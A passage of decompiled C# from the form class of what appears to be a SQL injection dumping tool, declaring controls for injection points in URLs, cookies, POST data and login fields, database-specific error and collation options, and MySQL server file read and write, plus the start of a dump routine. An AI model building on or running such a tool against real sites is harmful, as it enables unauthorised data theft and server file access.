				checkBox.CheckedChanged += eventHandler;
			}
		}
	}

	// Token: 0x17000202 RID: 514
	// (get) Token: 0x060005DC RID: 1500 RVA: 0x00023BDC File Offset: 0x00021DDC
	// (set) Token: 0x060005DD RID: 1501 RVA: 0x00023BE4 File Offset: 0x00021DE4
	internal virtual Label lblDumperRetryColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000203 RID: 515
	// (get) Token: 0x060005DE RID: 1502 RVA: 0x00023BF0 File Offset: 0x00021DF0
	// (set) Token: 0x060005DF RID: 1503 RVA: 0x00023BF8 File Offset: 0x00021DF8
	internal virtual CheckBox chkDumpIFNULL
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000204 RID: 516
	// (get) Token: 0x060005E0 RID: 1504 RVA: 0x00023C04 File Offset: 0x00021E04
	// (set) Token: 0x060005E1 RID: 1505 RVA: 0x00023C0C File Offset: 0x00021E0C
	internal virtual NumericUpDown numMaxRetryColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000205 RID: 517
	// (get) Token: 0x060005E2 RID: 1506 RVA: 0x00023C18 File Offset: 0x00021E18
	// (set) Token: 0x060005E3 RID: 1507 RVA: 0x00023C20 File Offset: 0x00021E20
	internal virtual CheckBox chkDumpEncodedHex
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000206 RID: 518
	// (get) Token: 0x060005E4 RID: 1508 RVA: 0x00023C2C File Offset: 0x00021E2C
	// (set) Token: 0x060005E5 RID: 1509 RVA: 0x00023C34 File Offset: 0x00021E34
	internal virtual CheckBox chkReDumpFailed
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000207 RID: 519
	// (get) Token: 0x060005E6 RID: 1510 RVA: 0x00023C40 File Offset: 0x00021E40
	// (set) Token: 0x060005E7 RID: 1511 RVA: 0x00023C48 File Offset: 0x00021E48
	internal virtual NumericUpDown numFieldByField
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000208 RID: 520
	// (get) Token: 0x060005E8 RID: 1512 RVA: 0x00023C54 File Offset: 0x00021E54
	// (set) Token: 0x060005E9 RID: 1513 RVA: 0x00023C5C File Offset: 0x00021E5C
	internal virtual CheckBox chkDumpFieldByField
	{
		[CompilerGenerated]
		get
		{
			return this._chkDumpFieldByField;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_140);
			CheckBox checkBox = this._chkDumpFieldByField;
			if (checkBox != null)
			{
				checkBox.CheckedChanged -= eventHandler;
			}
			this._chkDumpFieldByField = value;
			checkBox = this._chkDumpFieldByField;
			if (checkBox != null)
			{
				checkBox.CheckedChanged += eventHandler;
			}
		}
	}

	// Token: 0x17000209 RID: 521
	// (get) Token: 0x060005EA RID: 1514 RVA: 0x00023CA0 File Offset: 0x00021EA0
	// (set) Token: 0x060005EB RID: 1515 RVA: 0x00023CA8 File Offset: 0x00021EA8
	internal virtual Panel pnlSetupDump
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700020A RID: 522
	// (get) Token: 0x060005EC RID: 1516 RVA: 0x00023CB4 File Offset: 0x00021EB4
	// (set) Token: 0x060005ED RID: 1517 RVA: 0x00023CBC File Offset: 0x00021EBC
	internal virtual GroupBox grbOracleCollactions
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700020B RID: 523
	// (get) Token: 0x060005EE RID: 1518 RVA: 0x00023CC8 File Offset: 0x00021EC8
	// (set) Token: 0x060005EF RID: 1519 RVA: 0x00023CD0 File Offset: 0x00021ED0
	internal virtual CheckBox chkOracleCastAsChar
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700020C RID: 524
	// (get) Token: 0x060005F0 RID: 1520 RVA: 0x00023CDC File Offset: 0x00021EDC
	// (set) Token: 0x060005F1 RID: 1521 RVA: 0x00023CE4 File Offset: 0x00021EE4
	internal virtual ComboBox cmbOracleErrType
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700020D RID: 525
	// (get) Token: 0x060005F2 RID: 1522 RVA: 0x00023CF0 File Offset: 0x00021EF0
	// (set) Token: 0x060005F3 RID: 1523 RVA: 0x00023CF8 File Offset: 0x00021EF8
	internal virtual ComboBox cmbOracleTopN
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700020E RID: 526
	// (get) Token: 0x060005F4 RID: 1524 RVA: 0x00023D04 File Offset: 0x00021F04
	// (set) Token: 0x060005F5 RID: 1525 RVA: 0x00023D0C File Offset: 0x00021F0C
	internal virtual GroupBox grbMySQLCollactions
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700020F RID: 527
	// (get) Token: 0x060005F6 RID: 1526 RVA: 0x00023D18 File Offset: 0x00021F18
	// (set) Token: 0x060005F7 RID: 1527 RVA: 0x00023D20 File Offset: 0x00021F20
	internal virtual ComboBox cmbMySQLErrType
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000210 RID: 528
	// (get) Token: 0x060005F8 RID: 1528 RVA: 0x00023D2C File Offset: 0x00021F2C
	// (set) Token: 0x060005F9 RID: 1529 RVA: 0x00023D34 File Offset: 0x00021F34
	internal virtual ComboBox cmbMySQLCollations
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000211 RID: 529
	// (get) Token: 0x060005FA RID: 1530 RVA: 0x00023D40 File Offset: 0x00021F40
	// (set) Token: 0x060005FB RID: 1531 RVA: 0x00023D48 File Offset: 0x00021F48
	internal virtual GroupBox grbMSSQLCollactions
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000212 RID: 530
	// (get) Token: 0x060005FC RID: 1532 RVA: 0x00023D54 File Offset: 0x00021F54
	// (set) Token: 0x060005FD RID: 1533 RVA: 0x00023D5C File Offset: 0x00021F5C
	internal virtual GroupBox grbDumpSetup2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000213 RID: 531
	// (get) Token: 0x060005FE RID: 1534 RVA: 0x00023D68 File Offset: 0x00021F68
	// (set) Token: 0x060005FF RID: 1535 RVA: 0x00023D70 File Offset: 0x00021F70
	internal virtual GroupBox grbDumpSetup
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000214 RID: 532
	// (get) Token: 0x06000600 RID: 1536 RVA: 0x00023D7C File Offset: 0x00021F7C
	// (set) Token: 0x06000601 RID: 1537 RVA: 0x00023D84 File Offset: 0x00021F84
	internal virtual GroupBox grbSetupCon
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000215 RID: 533
	// (get) Token: 0x06000602 RID: 1538 RVA: 0x00023D90 File Offset: 0x00021F90
	// (set) Token: 0x06000603 RID: 1539 RVA: 0x00023D98 File Offset: 0x00021F98
	internal virtual CheckBox chkThreads
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000216 RID: 534
	// (get) Token: 0x06000604 RID: 1540 RVA: 0x00023DA4 File Offset: 0x00021FA4
	// (set) Token: 0x06000605 RID: 1541 RVA: 0x00023DAC File Offset: 0x00021FAC
	internal virtual NumericUpDown numThreads
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000217 RID: 535
	// (get) Token: 0x06000606 RID: 1542 RVA: 0x00023DB8 File Offset: 0x00021FB8
	// (set) Token: 0x06000607 RID: 1543 RVA: 0x00023DC0 File Offset: 0x00021FC0
	internal virtual Panel pnlSetupDump2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000218 RID: 536
	// (get) Token: 0x06000608 RID: 1544 RVA: 0x00023DCC File Offset: 0x00021FCC
	// (set) Token: 0x06000609 RID: 1545 RVA: 0x00023DD4 File Offset: 0x00021FD4
	internal virtual GroupBox grbInjectionPoint
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000219 RID: 537
	// (get) Token: 0x0600060A RID: 1546 RVA: 0x00023DE0 File Offset: 0x00021FE0
	// (set) Token: 0x0600060B RID: 1547 RVA: 0x00023DE8 File Offset: 0x00021FE8
	internal virtual CheckBox chkAddHearder
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700021A RID: 538
	// (get) Token: 0x0600060C RID: 1548 RVA: 0x00023DF4 File Offset: 0x00021FF4
	// (set) Token: 0x0600060D RID: 1549 RVA: 0x00023DFC File Offset: 0x00021FFC
	internal virtual Label lblHeaderValue
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700021B RID: 539
	// (get) Token: 0x0600060E RID: 1550 RVA: 0x00023E08 File Offset: 0x00022008
	// (set) Token: 0x0600060F RID: 1551 RVA: 0x00023E10 File Offset: 0x00022010
	internal virtual TextBox txtAddHeaderValue
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700021C RID: 540
	// (get) Token: 0x06000610 RID: 1552 RVA: 0x00023E1C File Offset: 0x0002201C
	// (set) Token: 0x06000611 RID: 1553 RVA: 0x00023E24 File Offset: 0x00022024
	internal virtual Label lblHeaderName
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700021D RID: 541
	// (get) Token: 0x06000612 RID: 1554 RVA: 0x00023E30 File Offset: 0x00022030
	// (set) Token: 0x06000613 RID: 1555 RVA: 0x00023E38 File Offset: 0x00022038
	internal virtual TextBox txtAddHeaderName
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700021E RID: 542
	// (get) Token: 0x06000614 RID: 1556 RVA: 0x00023E44 File Offset: 0x00022044
	// (set) Token: 0x06000615 RID: 1557 RVA: 0x00023E4C File Offset: 0x0002204C
	internal virtual Label lblInjectionPointMethod
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700021F RID: 543
	// (get) Token: 0x06000616 RID: 1558 RVA: 0x00023E58 File Offset: 0x00022058
	// (set) Token: 0x06000617 RID: 1559 RVA: 0x00023E60 File Offset: 0x00022060
	internal virtual Label lblInjectionPoint
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000220 RID: 544
	// (get) Token: 0x06000618 RID: 1560 RVA: 0x00023E6C File Offset: 0x0002206C
	// (set) Token: 0x06000619 RID: 1561 RVA: 0x00023E74 File Offset: 0x00022074
	internal virtual ComboBox cmbInjectionPoint
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000221 RID: 545
	// (get) Token: 0x0600061A RID: 1562 RVA: 0x00023E80 File Offset: 0x00022080
	// (set) Token: 0x0600061B RID: 1563 RVA: 0x00023E88 File Offset: 0x00022088
	internal virtual ComboBox cmbMethod
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000222 RID: 546
	// (get) Token: 0x0600061C RID: 1564 RVA: 0x00023E94 File Offset: 0x00022094
	// (set) Token: 0x0600061D RID: 1565 RVA: 0x00023E9C File Offset: 0x0002209C
	internal virtual TextBox txtCookies
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000223 RID: 547
	// (get) Token: 0x0600061E RID: 1566 RVA: 0x00023EA8 File Offset: 0x000220A8
	// (set) Token: 0x0600061F RID: 1567 RVA: 0x00023EB0 File Offset: 0x000220B0
	internal virtual TextBox txtPost
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000224 RID: 548
	// (get) Token: 0x06000620 RID: 1568 RVA: 0x00023EBC File Offset: 0x000220BC
	// (set) Token: 0x06000621 RID: 1569 RVA: 0x00023EC4 File Offset: 0x000220C4
	internal virtual Label lblPost
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000225 RID: 549
	// (get) Token: 0x06000622 RID: 1570 RVA: 0x00023ED0 File Offset: 0x000220D0
	// (set) Token: 0x06000623 RID: 1571 RVA: 0x00023ED8 File Offset: 0x000220D8
	internal virtual Label lblCookies
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000226 RID: 550
	// (get) Token: 0x06000624 RID: 1572 RVA: 0x00023EE4 File Offset: 0x000220E4
	// (set) Token: 0x06000625 RID: 1573 RVA: 0x00023EEC File Offset: 0x000220EC
	internal virtual GroupBox grbLogin
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000227 RID: 551
	// (get) Token: 0x06000626 RID: 1574 RVA: 0x00023EF8 File Offset: 0x000220F8
	// (set) Token: 0x06000627 RID: 1575 RVA: 0x00023F00 File Offset: 0x00022100
	internal virtual TextBox txtUserName
	{
		[CompilerGenerated]
		get
		{
			return this._txtUserName;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_152);
			TextBox textBox = this._txtUserName;
			if (textBox != null)
			{
				textBox.Leave -= eventHandler;
			}
			this._txtUserName = value;
			textBox = this._txtUserName;
			if (textBox != null)
			{
				textBox.Leave += eventHandler;
			}
		}
	}

	// Token: 0x17000228 RID: 552
	// (get) Token: 0x06000628 RID: 1576 RVA: 0x00023F44 File Offset: 0x00022144
	// (set) Token: 0x06000629 RID: 1577 RVA: 0x00023F4C File Offset: 0x0002214C
	internal virtual TextBox txtPassword
	{
		[CompilerGenerated]
		get
		{
			return this._txtPassword;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_152);
			TextBox textBox = this._txtPassword;
			if (textBox != null)
			{
				textBox.Leave -= eventHandler;
			}
			this._txtPassword = value;
			textBox = this._txtPassword;
			if (textBox != null)
			{
				textBox.Leave += eventHandler;
			}
		}
	}

	// Token: 0x17000229 RID: 553
	// (get) Token: 0x0600062A RID: 1578 RVA: 0x00023F90 File Offset: 0x00022190
	// (set) Token: 0x0600062B RID: 1579 RVA: 0x00023F98 File Offset: 0x00022198
	internal virtual Label lblLoginUser
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700022A RID: 554
	// (get) Token: 0x0600062C RID: 1580 RVA: 0x00023FA4 File Offset: 0x000221A4
	// (set) Token: 0x0600062D RID: 1581 RVA: 0x00023FAC File Offset: 0x000221AC
	internal virtual Label lblLoginPassword
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700022B RID: 555
	// (get) Token: 0x0600062E RID: 1582 RVA: 0x00023FB8 File Offset: 0x000221B8
	// (set) Token: 0x0600062F RID: 1583 RVA: 0x00023FC0 File Offset: 0x000221C0
	internal virtual CheckBox chkHttpRedirect
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700022C RID: 556
	// (get) Token: 0x06000630 RID: 1584 RVA: 0x00023FCC File Offset: 0x000221CC
	// (set) Token: 0x06000631 RID: 1585 RVA: 0x00023FD4 File Offset: 0x000221D4
	internal virtual ToolStripSeparator ToolStripSeparator1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700022D RID: 557
	// (get) Token: 0x06000632 RID: 1586 RVA: 0x00023FE0 File Offset: 0x000221E0
	// (set) Token: 0x06000633 RID: 1587 RVA: 0x00023FE8 File Offset: 0x000221E8
	internal virtual ToolStripComboBox cmbMySQLWriteFilePath
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700022E RID: 558
	// (get) Token: 0x06000634 RID: 1588 RVA: 0x00023FF4 File Offset: 0x000221F4
	// (set) Token: 0x06000635 RID: 1589 RVA: 0x00023FFC File Offset: 0x000221FC
	internal virtual ToolStripSeparator ToolStripSeparator3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700022F RID: 559
	// (get) Token: 0x06000636 RID: 1590 RVA: 0x00024008 File Offset: 0x00022208
	// (set) Token: 0x06000637 RID: 1591 RVA: 0x00024010 File Offset: 0x00022210
	internal virtual ToolStripSeparator ToolStripSeparator4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000230 RID: 560
	// (get) Token: 0x06000638 RID: 1592 RVA: 0x0002401C File Offset: 0x0002221C
	// (set) Token: 0x06000639 RID: 1593 RVA: 0x00024024 File Offset: 0x00022224
	internal virtual ToolStripComboBox cmbMySQLReadFile
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000231 RID: 561
	// (get) Token: 0x0600063A RID: 1594 RVA: 0x00024030 File Offset: 0x00022230
	// (set) Token: 0x0600063B RID: 1595 RVA: 0x00024038 File Offset: 0x00022238
	internal virtual ToolStripSeparator ToolStripSeparator6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000232 RID: 562
	// (get) Token: 0x0600063C RID: 1596 RVA: 0x00024044 File Offset: 0x00022244
	// (set) Token: 0x0600063D RID: 1597 RVA: 0x0002404C File Offset: 0x0002224C
	internal virtual ToolStrip tsNewDumpBtn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000233 RID: 563
	// (get) Token: 0x0600063E RID: 1598 RVA: 0x00024058 File Offset: 0x00022258
	// (set) Token: 0x0600063F RID: 1599 RVA: 0x00024060 File Offset: 0x00022260
	internal virtual ToolStripButton btnLoadDefautSettings
	{
		[CompilerGenerated]
		get
		{
			return this._btnLoadDefautSettings;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_143);
			ToolStripButton toolStripButton = this._btnLoadDefautSettings;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnLoadDefautSettings = value;
			toolStripButton = this._btnLoadDefautSettings;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000234 RID: 564
	// (get) Token: 0x06000640 RID: 1600 RVA: 0x000240A4 File Offset: 0x000222A4
	// (set) Token: 0x06000641 RID: 1601 RVA: 0x000240AC File Offset: 0x000222AC
	internal virtual ToolStripButton btnLoadNewDumper
	{
		[CompilerGenerated]
		get
		{
			return this._btnLoadNewDumper;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_146);
			ToolStripButton toolStripButton = this._btnLoadNewDumper;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnLoadNewDumper = value;
			toolStripButton = this._btnLoadNewDumper;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000235 RID: 565
	// (get) Token: 0x06000642 RID: 1602 RVA: 0x000240F0 File Offset: 0x000222F0
	// (set) Token: 0x06000643 RID: 1603 RVA: 0x000240F8 File Offset: 0x000222F8
	internal virtual ImageList imlTabs
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000236 RID: 566
	// (get) Token: 0x06000644 RID: 1604 RVA: 0x00024104 File Offset: 0x00022304
	// (set) Token: 0x06000645 RID: 1605 RVA: 0x0002410C File Offset: 0x0002230C
	internal virtual GroupBox grbMySQLSplitRows
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000237 RID: 567
	// (get) Token: 0x06000646 RID: 1606 RVA: 0x00024118 File Offset: 0x00022318
	// (set) Token: 0x06000647 RID: 1607 RVA: 0x00024120 File Offset: 0x00022320
	internal virtual NumericUpDown numMySQLSplitRowsLenght
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000238 RID: 568
	// (get) Token: 0x06000648 RID: 1608 RVA: 0x0002412C File Offset: 0x0002232C
	// (set) Token: 0x06000649 RID: 1609 RVA: 0x00024134 File Offset: 0x00022334
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000239 RID: 569
	// (get) Token: 0x0600064A RID: 1610 RVA: 0x00024140 File Offset: 0x00022340
	// (set) Token: 0x0600064B RID: 1611 RVA: 0x00024148 File Offset: 0x00022348
	internal virtual CheckBox chkMySQLSplitRows
	{
		[CompilerGenerated]
		get
		{
			return this._chkMySQLSplitRows;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_155);
			CheckBox checkBox = this._chkMySQLSplitRows;
			if (checkBox != null)
			{
				checkBox.CheckedChanged -= eventHandler;
			}
			this._chkMySQLSplitRows = value;
			checkBox = this._chkMySQLSplitRows;
			if (checkBox != null)
			{
				checkBox.CheckedChanged += eventHandler;
			}
		}
	}

	// Token: 0x1700023A RID: 570
	// (get) Token: 0x0600064C RID: 1612 RVA: 0x0002418C File Offset: 0x0002238C
	// (set) Token: 0x0600064D RID: 1613 RVA: 0x00024194 File Offset: 0x00022394
	internal virtual NumericUpDown numMySQLSplitRows
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700023B RID: 571
	// (get) Token: 0x0600064E RID: 1614 RVA: 0x000241A0 File Offset: 0x000223A0
	// (set) Token: 0x0600064F RID: 1615 RVA: 0x000241A8 File Offset: 0x000223A8
	internal virtual TabPage tpSearch
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700023C RID: 572
	// (get) Token: 0x06000650 RID: 1616 RVA: 0x000241B4 File Offset: 0x000223B4
	// (set) Token: 0x06000651 RID: 1617 RVA: 0x000241BC File Offset: 0x000223BC
	internal virtual ToolStrip tsSearchColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700023D RID: 573
	// (get) Token: 0x06000652 RID: 1618 RVA: 0x000241C8 File Offset: 0x000223C8
	// (set) Token: 0x06000653 RID: 1619 RVA: 0x000241D0 File Offset: 0x000223D0
	internal virtual ToolStripSeparator ToolStripSeparator7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700023E RID: 574
	// (get) Token: 0x06000654 RID: 1620 RVA: 0x000241DC File Offset: 0x000223DC
	// (set) Token: 0x06000655 RID: 1621 RVA: 0x000241E4 File Offset: 0x000223E4
	internal virtual ToolStripButton chkSearchColumnAllDBs
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700023F RID: 575
	// (get) Token: 0x06000656 RID: 1622 RVA: 0x000241F0 File Offset: 0x000223F0
	// (set) Token: 0x06000657 RID: 1623 RVA: 0x000241F8 File Offset: 0x000223F8
	internal virtual ToolStripSeparator ToolStripSeparator8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000240 RID: 576
	// (get) Token: 0x06000658 RID: 1624 RVA: 0x00024204 File Offset: 0x00022404
	// (set) Token: 0x06000659 RID: 1625 RVA: 0x0002420C File Offset: 0x0002240C
	internal virtual ToolStripButton btnSearchColumn
	{
		[CompilerGenerated]
		get
		{
			return this._btnSearchColumn;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_156);
			ToolStripButton toolStripButton = this._btnSearchColumn;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnSearchColumn = value;
			toolStripButton = this._btnSearchColumn;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000241 RID: 577
	// (get) Token: 0x0600065A RID: 1626 RVA: 0x00024250 File Offset: 0x00022450
	// (set) Token: 0x0600065B RID: 1627 RVA: 0x00024258 File Offset: 0x00022458
	internal virtual TextBox txtSearchColumnResult
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000242 RID: 578
	// (get) Token: 0x0600065C RID: 1628 RVA: 0x00024264 File Offset: 0x00022464
	// (set) Token: 0x0600065D RID: 1629 RVA: 0x0002426C File Offset: 0x0002246C
	internal virtual ToolStripComboBox txtSearchColumn
	{
		[CompilerGenerated]
		get
		{
			return this._txtSearchColumn;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_157);
			EventHandler eventHandler2 = new EventHandler(this.method_158);
			ToolStripComboBox toolStripComboBox = this._txtSearchColumn;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.Leave -= eventHandler;
				toolStripComboBox.TextChanged -= eventHandler2;
			}
			this._txtSearchColumn = value;
			toolStripComboBox = this._txtSearchColumn;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.Leave += eventHandler;
				toolStripComboBox.TextChanged += eventHandler2;
			}
		}
	}

	// Token: 0x0600065E RID: 1630 RVA: 0x000242CC File Offset: 0x000224CC
	private void method_0(Dumper.Enum5 enum5_1)
	{
		checked
		{
			if (!this.bool_2)
			{
				bool flag;
				switch (this.cmbInjectionPoint.SelectedIndex)
				{
				case 0:
					flag = this.txtURL.Text.IndexOf("[t]") > 0;
					break;
				case 1:
					flag = this.txtCookies.Text.IndexOf("[t]") >= 0;
					break;
				case 2:
					flag = this.txtPost.Text.IndexOf("[t]") >= 0;
					break;
				case 3:
					flag = this.txtUserName.Text.IndexOf("[t]") >= 0;
					break;
				case 4:
					flag = this.txtPassword.Text.IndexOf("[t]") >= 0;
					break;
				}
				if (!flag)
				{
					this.UpDateStatus(global::Globals.translate_0.GetStr(this, 6, ""), false);
					Interaction.Beep();
				}
				else
				{
					this.enum5_0 = enum5_1;
					this.class44_0 = new Dumper.Class44();
					this.class45_0 = new Dumper.Class45();
					this.bool_3 = false;
					this.bool_5 = false;
					this.list_0 = new List<string>();
					if (Class54.smethod_9(this.types_0))
					{
						Dumper.Enum5 @enum = this.enum5_0;
						if (@enum != Dumper.Enum5.const_0)
						{
							switch (@enum)
							{
							case Dumper.Enum5.const_5:
							case Dumper.Enum5.const_7:
							case Dumper.Enum5.const_8:
								break;
							default:
								if (this.lblVersion.Text.StartsWith("4"))
								{
									this.UpDateStatus(global::Globals.translate_0.GetStr(this, 7, ""), false);
									Interaction.Beep();
									return;
								}
								break;
							}
						}
					}
					if ((this.enum5_0 == Dumper.Enum5.const_4) | (this.enum5_0 == Dumper.Enum5.const_5) | (this.enum5_0 == Dumper.Enum5.const_7))
					{
						this.dumpGrid_0 = new DumpGrid(this);
					}
					if (this.enum5_0 == Dumper.Enum5.const_7)
					{
						if (string.IsNullOrEmpty(this.txtMySQLReadFilePath.Text))
						{
							this.UpDateStatus(global::Globals.translate_0.GetStr(this, 8, ""), false);
							Interaction.Beep();
							return;
						}
					}
					else if (this.enum5_0 == Dumper.Enum5.const_8)
					{
						if (string.IsNullOrEmpty(this.txtMySQLWriteFile.Text))
						{
							this.UpDateStatus(global::Globals.translate_0.GetStr(this, 9, ""), false);
							Interaction.Beep();
							return;
						}
						if (string.IsNullOrEmpty(this.txtMySQLWriteFilePath.Text))
						{
							this.UpDateStatus(global::Globals.translate_0.GetStr(this, 10, ""), false);
							Interaction.Beep();
							return;
						}
					}
					else if (this.enum5_0 == Dumper.Enum5.const_5)
					{
						if (Class54.smethod_9(this.types_0))
						{
							string text = this.txtCustomQueryFrom.Text.Trim();
							if (!string.IsNullOrEmpty(text))
							{
								text = "from " + text;
							}
							this.method_15(ref text);
							this.class45_0.method_2("DataBase");
							this.class45_0.method_3("DataBase", "Table");
							this.class45_0.method_5("DataBase", "Table", text);
							string[] array = this.txtCustomQuery.Text.Split(new char[] { ',' });
							foreach (string text2 in array)
							{
								if (!string.IsNullOrEmpty(text2))
								{
									this.class45_0.method_4("DataBase", "Table", text2.Trim());
								}
							}
							bool flag2;
							try
							{
								foreach (KeyValuePair<string, Dumper.Class45.Class46> keyValuePair in this.class45_0.dictionary_0)
								{
									if (flag2 = !string.IsNullOrEmpty(keyValuePair.Value.DataBase))
									{
										break;
									}
								}
							}
							finally
							{
								Dictionary<string, Dumper.Class45.Class46>.Enumerator enumerator;
								((IDisposable)enumerator).Dispose();
							}
							if (!flag2)
							{
								this.UpDateStatus(global::Globals.translate_0.GetStr(this, 11, ""), false);
								Interaction.Beep();
								return;
							}
						}
						else
						{
							string text3 = this.txtCustomQuery.Text.Trim();
							this.method_15(ref text3);
							if (string.IsNullOrEmpty(text3))
							{
								this.UpDateStatus(global::Globals.translate_0.GetStr(this, 12, ""), false);
								Interaction.Beep();
								return;
							}
							this.class45_0.method_2("DataBase");
							this.class45_0.method_3("DataBase", "Table");
							this.class45_0.method_5("DataBase", "Table", text3);
						}
					}
					else
					{
						if (this.enum5_0 == Dumper.Enum5.const_6)
						{
							if ((this.trwSchema.SelectedNode == null) & (this.enum4_0 > Dumper.Enum4.const_0))
							{
								Interaction.Beep();
								return;
							}
							string text4;
							string text5;
							if (this.trwSchema.SelectedNode != null)
